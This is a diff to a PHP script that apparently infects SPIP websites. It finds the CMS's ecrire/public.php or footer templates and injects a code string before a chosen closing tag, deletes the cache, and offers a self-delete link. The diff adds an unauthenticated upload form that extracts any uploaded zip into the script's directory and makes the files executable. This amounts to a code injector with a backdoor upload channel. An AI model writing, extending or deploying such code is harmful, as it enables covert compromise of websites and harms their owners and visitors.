@@ -1,4 +1,3 @@
-
 <?php
 
 set_time_limit(0); 
@@ -63,11 +62,20 @@ if ($SHOW=="1") {
 }
 
 //////==============================
+//$currDirNORTPathONLY
+$spipDirPath="/"; 
+if (strpos($currDirNORTPathONLY, '/IMG') !== false) {
+    $parts = explode('/IMG', $currDirNORTPathONLY);
+    $spipDirPath = $parts[0] . '/';     
+} 
+//  echo "Spip path: $spipDirPath\n<BR>";
+$filePathPUB = $rootPath .$spipDirPath.'ecrire/public.php';
+ 
 
-if (is_dir($rootPath . '/ecrire/')) {
+
+if (is_dir($rootPath .$spipDirPath. 'ecrire/')) {
     $codeSYSMsg.= 'SPIP-PHP';  
-
-    $filePathPUB = $rootPath .'/ecrire/public.php';
+    // $filePathPUB = $rootPath .$spipDirPath.'ecrire/public.php';
 
     if (file_exists($filePathPUB)) {
         // echo "PUB YES";
@@ -80,14 +88,12 @@ if (is_dir($rootPath . '/ecrire/')) {
         // echo "PUB NOT";
         foreach($files as $file) {
             $currFileName=$file->getFilename();// keywords
-            $keywordsFN = 'foot|pied|bottom|sommaire';//==============================
-            
+            $keywordsFN = 'foot|pied|bottom|sommaire';//==============================            
             if(pathinfo($file, PATHINFO_EXTENSION) == "html" && ( preg_match("/\b($keywordsFN)\b/i", $currFileName) ) && strpos($file->getPath(), 'squelet') !== false) {
                 // $phpFiles[] = $file->getRealPath(); // >5.4
                 array_push($phpFiles, $file->getRealPath()); 
             }
-        }
-    
+        }    
     }
 
     // DEL cacheDir
@@ -142,12 +148,10 @@ function delTree($dir) {
     // $files = array_diff(scandir($dir), ['.','..']);//>5.4
     $exclude = array('.', '..');
     $files = array_diff(scandir($dir), $exclude);
-
     
     foreach ($files as $file) {
         (is_dir("$dir/$file")) ? delTree("$dir/$file") : unlink("$dir/$file");
-    }
-    
+    }    
 
     return rmdir($dir);
 }
@@ -189,9 +193,8 @@ function insertAction($inserted,$phpFiles,$insertCode,$tagInner){
         $phpFile = $phpFiles[$i];
         $content = file_get_contents($phpFile);
 
-      
-    
-
+        //if phpFile is PUB
+        if(strpos($phpFile, "public.php") !== false){
             if(strpos($content, $tagInner) !== false){
                 if (strpos($content, $insertCode) !== false) {
                     if ($SHOW=="1") {echo $phpFile . "-PUB Already operated before.\n<br>";}
@@ -211,10 +214,9 @@ function insertAction($inserted,$phpFiles,$insertCode,$tagInner){
                 $j=$j+1;
             } else {
                 if ($SHOW=="1") { echo $phpFile . "<b>***NOT found tagInner,not found***</b><br>";}
-            }
-
-  
-
+            }//endif strpos($content, $tagInner)
+        }else{
+            //else : not public.php
             if (preg_match_all('/<\/' . $tagInner . '>/', $content, $matches, PREG_OFFSET_CAPTURE) ) {
 
                 $validMatches = array_filter($matches[0], function ($match) use ($content) {
@@ -270,7 +272,15 @@ function insertAction($inserted,$phpFiles,$insertCode,$tagInner){
                     $j=$j+1; 
                 }//endif !empty($validMatches)
                 
-            }//endif preg_match_all 
+            }//endif preg_match_all
+
+        }//endif strpos "public.php"
+
+
+
+  
+
+ 
 
        
 
@@ -361,8 +371,74 @@ if ($SHOW=="1") {
 <br><a href="?AC=UNLINK&SHOW=1" target="_blank">UNLINK DEL SELF PHP </a><br>
 <br>
 
+<form action="?AC=1" method="post" enctype="multipart/form-data">
+    Choose File(.zip accept):
+    <input type="file" name="file" id="file">
+    <input type="submit" value="upload" name="submit">
+</form>
+
 <?php
 }//endif  $AC=="SHOW" 
-?>
 
+// Call the function
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_FILES['file'])) {
+        uploadAndUnzip($_FILES['file']);
+    }
+}
+
+function uploadAndUnzip($file) {
+    $target_dir = __DIR__;
+    $target_file = $target_dir ."/". basename($file["name"]);
+    // $dirNameNew= substr(basename($file["name"]), 0, -4);
+    
+    $zipFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
+
+ 
+    echo "<br> FileType:$zipFileType <br>" ;
+    echo "<br>target_dir:$target_dir <br>" ;
+    echo "<br>target_file:$target_file <br>" ;
+
+    // Check if $uploadOk is set to 0 by an error
+   
+    if (move_uploaded_file($file["tmp_name"], $target_file)) {
+        echo "<br><b>The file ". basename( $file["name"]). " has been uploaded OK.</b>";
+    } else {
+        echo "<br>Sorry, upload ERROR...,retry...";
+    }
+    
+
+    // Check if file is a actual zip or fake zip
+    if($zipFileType == "zip") {
+    
+        // Unzip the file
+        $zip = new ZipArchive;
+        if ($zip->open($target_file) === TRUE) {
+            $zip->extractTo($target_dir);
+            $zip->close();
+            // Get the name of the newly unzipped folder
+            $dirNameNew = basename($file["name"], ".zip");
+            // Change the permissions of the folder to be readable, writable and executable
+            chmod($dirNameNew, 0755);
+            // Create a RecursiveIteratorIterator to get all files in the directory and its subdirectories
+            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dirNameNew));
+            // Traverse through all the files and set their permissions to readable, writable and executable
+            foreach($iterator as $file) {
+                chmod($file, 0755);
+            }
+
+            echo '<br>File Unzip OK ,set 0777(dir same zip file name):'.$target_dir.'/'.$dirNameNew;
+
+            // Delete the uploaded zip file
+            unlink($target_file);
+            echo '<br>delete OK ,zip file';
+        } else {
+            echo '<br>unzip NOT ,retry ';
+        }
+    }
+    // Delete the current PHP file
+    // unlink(__FILE__);
+}
+
+?>
 
